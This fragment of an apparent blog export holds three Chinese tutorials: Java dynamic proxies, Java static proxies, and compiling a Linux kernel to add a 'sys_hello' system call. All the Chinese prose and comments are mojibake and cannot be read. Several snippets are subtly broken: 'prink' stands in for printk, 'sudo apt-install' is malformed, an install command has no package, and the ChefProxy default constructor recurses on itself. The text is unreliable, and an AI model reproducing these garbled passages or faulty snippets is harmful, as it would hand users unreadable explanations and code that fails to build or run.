<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ProxyInvocationHandler pih = <span class="keyword">new</span> ProxyInvocationHandler();</span><br><span class="line">        Cook d_shef = <span class="keyword">new</span> Chef();</span><br><span class="line">        <span class="comment">// è®¾ç½®éœ€è¦ä»£ç†çš„å¯¹è±¡</span></span><br><span class="line">        pih.setTarget(d_shef);</span><br><span class="line">        <span class="comment">// åŠ¨æ€ç”Ÿæˆä»£ç†ç±»</span></span><br><span class="line">        Cook proxy = (Cook) pih.getProxy();</span><br><span class="line">        proxy.cook(<span class="string">"ç•ªèŒ„ç‚’è›‹"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">cook</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chef</span> <span class="keyword">implements</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cook</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// å…·ä½“çš„å®é™…å®ç°é€»è¾‘</span></span><br><span class="line">        System.out.println(<span class="string">"=======å¨å¸ˆåšé¥­å•¦:"</span>+name+<span class="string">"======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”¨äºè‡ªåŠ¨ç”Ÿæˆä»£ç†ç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è¢«ä»£ç†çš„æ¥å£</span></span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTarget</span><span class="params">(Object target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç”Ÿæˆå¾—åˆ°ä»£ç†ç±»</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(<span class="keyword">this</span>.getClass().getClassLoader(),</span><br><span class="line">                target.getClass().getInterfaces(), <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¤„ç†ä»£ç†å®ä¾‹ å¹¶è¿”å›ç»“æœ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> proxy  ä»£ç†å¯¹è±¡</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method ä»£ç†å¯¹è±¡è°ƒç”¨çš„æ–¹æ³•</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> è°ƒç”¨çš„æ–¹æ³•ä¸­çš„å‚æ•°</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Throwable</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        before();</span><br><span class="line">        <span class="comment">//  åŠ¨æ€ä»£ç†çš„æœ¬è´¨ï¼Œæ˜¯åˆ©ç”¨åå°„æœºåˆ¶å®ç°</span></span><br><span class="line">        Object result = method.invoke(target, args);</span><br><span class="line">        after();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é¢„å¤„ç†</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"=======é£Ÿæå‡†å¤‡å®Œæ¯•======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åå¤„ç†</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"=======å¨å…·æ¸…ç†å®Œæ¯•======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ§åˆ¶å°è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;é£Ÿæå‡†å¤‡å®Œæ¯•&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å¨å¸ˆåšé¥­å•¦:ç•ªèŒ„ç‚’è›‹&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å¨å…·æ¸…ç†å®Œæ¯•&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ä¼˜ç‚¹ï¼šåªéœ€è¦å®šä¹‰å®ç°<code>InvocationHandler</code>æ¥å£çš„å®ç°ç±»ï¼Œåˆ©ç”¨è¯¥ç±»çš„å®ä¾‹å¯¹è±¡å°†æ‰˜ç®¡ç±»çš„å®ä¾‹å¯¹è±¡è¿›è¡Œç»‘å®šå³å¯å®ç°ä»£ç†ï¼› åŠ¨æ€ä»£ç†çš„æœåŠ¡å†…å®¹ä¸éœ€è¦åƒé™æ€ä»£ç†ä¸€æ ·å†™åœ¨æ¯ä¸ªä»£ç å—ä¸­ï¼Œåªéœ€è¦å†™åœ¨invoke()æ–¹æ³•ä¸­å³å¯ï¼Œé™ä½äº†ä»£ç çš„å†—ä½™åº¦ã€‚ </p>
</li>
<li><p>ç¼ºç‚¹ï¼šä»»ç„¶éœ€è¦ä¸€ä¸ªå®ç°æ¥å£çš„å®ç°ç±»ã€‚è¦æƒ³ä¸éœ€è¦æ¥å£ï¼Œå¯å€ŸåŠ© <code>CGLIB</code>ï¼Œå…³äºç›¸å…³çš„ç”¨æ³•ï¼Œä¸åœ¨æœ¬æ–‡ä»‹ç»èŒƒå›´ä¹‹å†…ã€‚</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>åŠ¨æ€ä»£ç†</tag>
      </tags>
  </entry>
  <entry>
    <title>è®¾è®¡æ¨¡å¼ä¹‹é™æ€ä»£ç†</title>
    <url>/2020/05/10/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h2 id="ä»£ç†æ¨¡å¼å®šä¹‰"><a href="#ä»£ç†æ¨¡å¼å®šä¹‰" class="headerlink" title="ä»£ç†æ¨¡å¼å®šä¹‰"></a>ä»£ç†æ¨¡å¼å®šä¹‰</h2><p>ä»£ç†æ¨¡å¼åˆå«å§”æ‰˜æ¨¡å¼ï¼Œä¸ºæŸä¸€ä¸ªå¯¹è±¡æä¾›ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œä»£ç†é€šè¿‡è®¿é—®åŸå¯¹è±¡ï¼Œä½¿å¾—çœŸæ­£å®æ–½åŠ¨ä½œçš„æ˜¯åŸå¯¹è±¡ã€‚ä¸€ä¸ªç®€å•çš„ä¾‹å­å°±æ˜¯ï¼š</p>
<p>ä¸€ä¸ªå¨å¸ˆæƒ³è¦åšé¥­çš„æ—¶å€™ï¼Œä»–å¿…é¡»è¦æœ‰é£Ÿæï¼Œåšå®Œé¥­ä¹‹åéœ€è¦æ¸…ç†å¨å…·ï¼Œä½†æ˜¯å¯¹äºå¨å¸ˆæ¥è¯´ï¼Œä»–çš„ä»»åŠ¡å°±æ˜¯åšé¥­ï¼Œå…¶ä»–çš„äº‹æƒ…ä»–ä¸æƒ³æ’æ‰‹ï¼Œé‚£ä¹ˆä»–å°±å¯ä»¥é›‡ç”¨ä¸€ä¸ªå¸®æ‰‹ï¼Œä¸ºä»–åšè¿™äº›å‡†å¤‡å·¥ä½œå’Œå¤„ç†å·¥ä½œã€‚<a id="more"></a></p>
<p>ä»£ç†æ¨¡å¼ä¸€èˆ¬å¯åˆ†ä¸ºé™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†ï¼š</p>
<ul>
<li>é™æ€ä»£ç†ï¼š ç”±ç¨‹åºå‘˜åˆ›å»ºæˆ–å·¥å…·ç”Ÿæˆä»£ç†ç±»çš„æºç ï¼Œå†ç¼–è¯‘ä»£ç†ç±»ã€‚ é™æ€ä»£ç†ä¹Ÿå°±æ˜¯æ„å‘³ç€ç¨‹åºè¿è¡Œä¹‹å‰å°±å·²ç»è‡ªåŠ¨ç”Ÿæˆä»£ç†ç±»çš„å­—èŠ‚ç æ–‡ä»¶ï¼Œä»£ç†ç±»å’Œå§”æ‰˜ç±»çš„å…³ç³»å°±å·²ç»ç¡®è®¤ä¸‹æ¥ã€‚</li>
<li>åŠ¨æ€ä»£ç†ï¼š åŠ¨æ€ä»£ç†ç±»çš„æºç æ˜¯åœ¨ç¨‹åºè¿è¡ŒæœŸé—´ç”±JVMæ ¹æ®åå°„ç­‰æœºåˆ¶åŠ¨æ€çš„ç”Ÿæˆï¼Œè¿‡ç¨‹ä¸ä¼šç”Ÿæˆå¤šä½™çš„å­—èŠ‚ç æ–‡ä»¶ï¼Œä»£ç†ç±»å’Œå§”æ‰˜ç±»çš„å…³ç³»åœ¨è¿è¡Œæ—¶æœŸç¡®è®¤ã€‚</li>
</ul>
<p>æœ¬æ–‡åªè®¨è®ºé™æ€ä»£ç†ã€‚</p>
<h2 id="ä»£ç è¯´æ˜"><a href="#ä»£ç è¯´æ˜" class="headerlink" title="ä»£ç è¯´æ˜"></a>ä»£ç è¯´æ˜</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> study.design.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Cook chef  = <span class="keyword">new</span> Chef();</span><br><span class="line">        Cook chefProxy = <span class="keyword">new</span> ChefProxy(chef);</span><br><span class="line">        chefProxy.cook();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å§”æ‰˜ç±»å’Œä»£ç†ç±»éƒ½è¦å®ç°è¯¥æ¥å£</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">cook</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chef</span> <span class="keyword">implements</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// å…·ä½“çš„å®é™…å®ç°é€»è¾‘</span></span><br><span class="line">        System.out.println(<span class="string">"=======å¨å¸ˆåšé¥­å•¦======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChefProxy</span> <span class="keyword">implements</span> <span class="title">Cook</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Cook chef = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é»˜è®¤ä»£ç†è‡ªå·±</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChefProxy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.chef = <span class="keyword">new</span> ChefProxy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŒ‡æ˜éœ€è¦ä»£ç†çš„å¯¹è±¡</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChefProxy</span><span class="params">(Cook chef)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.chef = chef;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.before();</span><br><span class="line">        <span class="keyword">this</span>.chef.cook();</span><br><span class="line">        <span class="keyword">this</span>.after();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é¢„å¤„ç†</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"=======é£Ÿæå‡†å¤‡å®Œæ¯•======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åå¤„ç†</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"=======å¨å…·æ¸…ç†å®Œæ¯•======="</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ§åˆ¶å°è¾“å‡º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;é£Ÿæå‡†å¤‡å®Œæ¯•&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å¨å¸ˆåšé¥­å•¦&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å¨å…·æ¸…ç†å®Œæ¯•&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¼˜ç‚¹ï¼šå§”æ‰˜ç±»åªå…³å¿ƒå…·ä½“çš„é€»è¾‘ï¼Œæ— éœ€æµªè´¹æ—¶é—´åœ¨å…¶ä»–æ— å…³äº‹åŠ¡ä¸Šé¢ï¼›ä»£ç†ç±»è¿˜å¯ä»¥å®ç°å¯¹å§”æ‰˜ç±»çš„ç®¡æ§ï¼Œä¾‹å¦‚è¯´ä¸Šæ–‡çš„ä¾‹å­ï¼Œå‡å¦‚æŸé“èœå¨å¸ˆä¸ä¼šåšæˆ–è€…ä¸åœ¨è¡Œï¼Œå¸®æ‰‹å¯ä»¥æé†’æˆ–è€…ç›´æ¥æ‹’ç»å¨å¸ˆçš„è¡Œä¸ºï¼Œå³æ ¹æ®å¯¹è±¡çš„æƒé™æ¥è¿›è¡Œå®æ–½åŠ¨ä½œã€‚</li>
<li>ä¸è¶³ï¼š<ul>
<li>éœ€è¦ä»£ç†çš„é€»è¾‘æ–¹æ³•æ¯”è¾ƒå°‘çš„æ—¶å€™éš¾åº¦ä¸å¤§ï¼Œå‡å¦‚æ–¹æ³•éå¸¸å¤šçš„æ—¶å€™ï¼Œä»£ç é‡å°±ä¼šéå¸¸å¤š</li>
<li>æ¥å£å¢åŠ æ–¹æ³•çš„æ—¶å€™ï¼Œä¸ä»…ä»…å§”æ‰˜ç±»éœ€è¦å®ç°è¯¥æ–¹æ³•ï¼Œä»£ç†ç±»ä¹Ÿéœ€è¦å®ç°è¯¥æ–¹æ³•ï¼Œä»£ç ç»´æŠ¤éš¾åº¦å¤§ã€‚</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>é™æ€ä»£ç†</tag>
      </tags>
  </entry>
  <entry>
    <title>é€šè¿‡ç¼–è¯‘å†…æ ¸çš„æ–¹å¼å¢åŠ ç³»ç»Ÿè°ƒç”¨</title>
    <url>/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>Ubuntu ç‰ˆæœ¬ï¼š20.04 LTS</p>
<p>è™šæ‹Ÿæœºé…ç½®ï¼šç¡¬ç›˜ï¼š40 GB å†…å­˜ï¼š4 GB</p>
<p>å†…æ ¸ç‰ˆæœ¬ï¼š5.4.0.26-generic</p>
<p>VMware ç‰ˆæœ¬ï¼š15.5.0</p>
</blockquote>
<h2 id="å‰æœŸå‡†å¤‡"><a href="#å‰æœŸå‡†å¤‡" class="headerlink" title="å‰æœŸå‡†å¤‡"></a>å‰æœŸå‡†å¤‡</h2><p>ç¼–è¯‘çš„æ—¶å€™éœ€è¦ä¸€äº›åº“ï¼Œæ‰€ä»¥è¦æå‰å®‰è£…ï¼š<a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libncurses5-dev</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install bison</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install flex</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-install kernel-package</span><br></pre></td></tr></table></figure>

<p>è¿™ä¹ˆå¤šï¼Ÿï¼Ÿå¥½å§ï¼Œå…¶å®ä¸ä¸€å®šéœ€è¦å…¨éƒ¨ï¼Œéƒ¨åˆ†Linuxå‘è¡Œç‰ˆå¯èƒ½è‡ªå¸¦ï¼Œå¯ä»¥å…ˆè·³è¿‡è¿™ä¸€æ­¥ï¼Œå…ˆåšåé¢çš„äº‹æƒ…ï¼Œå‰ææ˜¯è‡ªå·±å…ˆåšå¥½ä¸­é€”å‡ºç°<code>error</code>çš„å‡†å¤‡ï¼ä¸­é€”å‡ºç°é”™è¯¯çš„è¯å¯ä»¥æ ¹æ®æç¤ºå®‰è£…å³å¯ã€‚</p>
<h2 id="æŸ¥çœ‹è‡ªå·±å†…æ ¸ç‰ˆæœ¬"><a href="#æŸ¥çœ‹è‡ªå·±å†…æ ¸ç‰ˆæœ¬" class="headerlink" title="æŸ¥çœ‹è‡ªå·±å†…æ ¸ç‰ˆæœ¬"></a>æŸ¥çœ‹è‡ªå·±å†…æ ¸ç‰ˆæœ¬</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p>æˆ‘çš„æ˜¯ 5.4.0.26-generic</p>
<h2 id="ä¸‹è½½å†…æ ¸"><a href="#ä¸‹è½½å†…æ ¸" class="headerlink" title="ä¸‹è½½å†…æ ¸"></a>ä¸‹è½½å†…æ ¸</h2><p>å°½é‡ä¸‹è½½å’Œè‡ªå·±å†…æ ¸ç›¸è¿‘çš„å†…æ ¸,é¿å…ç‰ˆæœ¬è·¨åº¦è¿‡å¤§å¼•èµ·ä¸å…¼å®¹æƒ…å†µã€‚ä¸‹é¢æ˜¯ç½‘å€</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cdn.kernel.org&#x2F;pub&#x2F;linux&#x2F;kernel</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä¸‹è½½çš„æ˜¯<code>linux-5.3.9.tar.xz</code></p>
<h2 id="è§£å‹ç¼©å†…æ ¸æ–‡ä»¶"><a href="#è§£å‹ç¼©å†…æ ¸æ–‡ä»¶" class="headerlink" title="è§£å‹ç¼©å†…æ ¸æ–‡ä»¶"></a>è§£å‹ç¼©å†…æ ¸æ–‡ä»¶</h2><p>é¦–å…ˆå°†ä¸Šé¢çš„å†…æ ¸æ–‡ä»¶ç§»åŠ¨åˆ°<code>/usr/src/</code>ç›®å½•ä¸‹</p>
<p>åœ¨<code>/usr/src/</code>ç›®å½•ä¸‹æ‰“å¼€ç»ˆç«¯</p>
<p>è§£å‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo xz -d linux-5.3.9.tar.xz</span><br></pre></td></tr></table></figure>

<p>è§£åŒ…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -xvf linux-5.3.9.tar</span><br></pre></td></tr></table></figure>

<h2 id="åŠ å…¥å‡½æ•°"><a href="#åŠ å…¥å‡½æ•°" class="headerlink" title="åŠ å…¥å‡½æ•°"></a>åŠ å…¥å‡½æ•°</h2><p>è§£åŒ…å®Œæ¯•ä¹‹åä¼šå‡ºç°ä¸€ä¸ª<code>linux-5.3.9</code>æ–‡ä»¶å¤¹ï¼Œè¿›å…¥è¯¥æ–‡ä»¶å¤¹çš„<code>kernel</code>æ–‡ä»¶å¤¹ä¸­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd linux-5.3.9&#x2F;kernel</span><br></pre></td></tr></table></figure>

<p>ç¼–è¾‘<code>sys.c</code>æ–‡ä»¶ï¼Œåœ¨æœ«å°¾åŠ å…¥å‡½æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_hello</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    prink(<span class="string">"hello syscall!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ·»åŠ å‡½æ•°å£°æ˜"><a href="#æ·»åŠ å‡½æ•°å£°æ˜" class="headerlink" title="æ·»åŠ å‡½æ•°å£°æ˜"></a>æ·»åŠ å‡½æ•°å£°æ˜</h2><p>è¿›å…¥<code>/usr/src/linux-5.3.9/arch/x86/include/asm</code></p>
<p>ç¼–è¾‘ <code>syscalls.h</code>ï¼ŒåŠ å…¥æˆ‘ä»¬çš„<code>sys_hello</code>å‡½æ•°ï¼š</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588224505122.png" class>

<h2 id="ç»™æˆ‘ä»¬çš„ç³»ç»Ÿè°ƒç”¨åˆ†é…ä¸€ä¸ªid"><a href="#ç»™æˆ‘ä»¬çš„ç³»ç»Ÿè°ƒç”¨åˆ†é…ä¸€ä¸ªid" class="headerlink" title="ç»™æˆ‘ä»¬çš„ç³»ç»Ÿè°ƒç”¨åˆ†é…ä¸€ä¸ªid"></a>ç»™æˆ‘ä»¬çš„ç³»ç»Ÿè°ƒç”¨åˆ†é…ä¸€ä¸ªid</h2><p>æ‰“å¼€<code>/usr/src/linux-5.3.9/arch/x86/entry/syscalls/syscall_64.tbl</code>ï¼Œ</p>
<p>ä¸€å®šè¦ç¡®ä¿ä¸ä¼šè·Ÿå·²æœ‰çš„å†²çª</p>
<p>æˆ‘åŠ çš„æ˜¯</p>
<p>548 64 hello sys_hello</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588225138576.png" class>

<h2 id="é…ç½®å†…æ ¸"><a href="#é…ç½®å†…æ ¸" class="headerlink" title="é…ç½®å†…æ ¸"></a>é…ç½®å†…æ ¸</h2><p>è¿›å…¥åˆ°<code>/usr/src/linux-5.3.9</code>ç›®å½•ä¸‹ï¼Œä¾æ¬¡æ‰§è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make mrproper</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make clean</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make menuconfig</span><br></pre></td></tr></table></figure>

<p>å‡å¦‚æ‰§è¡Œ<code>sudo make menuconfig</code>æ—¶å€™å‡ºç°ä¸‹é¢çš„é”™è¯¯</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588253321277.png" class>

<p>å°†è™šæ‹Ÿæœºå…¨å±å³å¯ï¼ˆæ’‘æ»¡å±å¹•ï¼‰</p>
<p>ç„¶åå‡ºç°è¯¥é¡µé¢ï¼Œç›´æ¥<code>save</code>ï¼Œç„¶å<code>exit</code>ã€‚</p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588253775435.png" class>

<p>ç„¶åå°±å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤ç¼–è¯‘æˆ‘ä»¬çš„å†…æ ¸äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make</span><br></pre></td></tr></table></figure>

<p>è¯¥è¿‡ç¨‹å¤§æ¦‚æŒç»­å‡ ä¸ªå°æ—¶ï¼Œåæ­£æˆ‘æ˜¯æ”¾åå°ï¼Œç„¶åå…ˆå»ç¡è§‰çš„~~ã€‚</p>
<p><strong>ä½†æ˜¯ï¼ç­‰æˆ‘ç¡é†’æ‰å‘ç°ï¼Œç”µè„‘è‡ªåŠ¨ä¼‘çœ äº†ï¼ç™½ç™½æµªè´¹äº†ä¸€ä¸ªæ™šä¸Šçš„æ—¶é—´ï¼Œæ‰€ä»¥æé†’ç¼–è¯‘ä¹‹å‰å°†ç”µè„‘çš„ä¼‘çœ æ¨¡å¼å…³é—­ã€‚è¿˜æœ‰ç¼–è¯‘è¿‡ç¨‹ä¼šäº§ç”Ÿå¤§é‡ä¸­é—´æ–‡ä»¶ï¼Œå»ºè®®ç¡¬ç›˜ç»™å¤Ÿ 40 GB</strong></p>
<img src="/2020/05/02/%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8%E7%9A%84%E6%96%B9%E5%BC%8F%E5%A2%9E%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/1588329524537.png" class>

<p>å‡ºç°ç±»ä¼¼ä¸Šé¢çš„ä¿¡æ¯å°±è¯´æ˜ç¼–è¯‘æˆåŠŸäº†ã€‚</p>
<h2 id="ç”Ÿæˆmodules"><a href="#ç”Ÿæˆmodules" class="headerlink" title="ç”Ÿæˆmodules"></a>ç”Ÿæˆmodules</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make modules</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªè¿‡ç¨‹ä¹Ÿéœ€è¦ä¸€å®šçš„æ—¶é—´ã€‚</p>
<h2 id="å®‰è£…modules"><a href="#å®‰è£…modules" class="headerlink" title="å®‰è£…modules"></a>å®‰è£…modules</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make modules_install</span><br></pre></td></tr></table></figure>

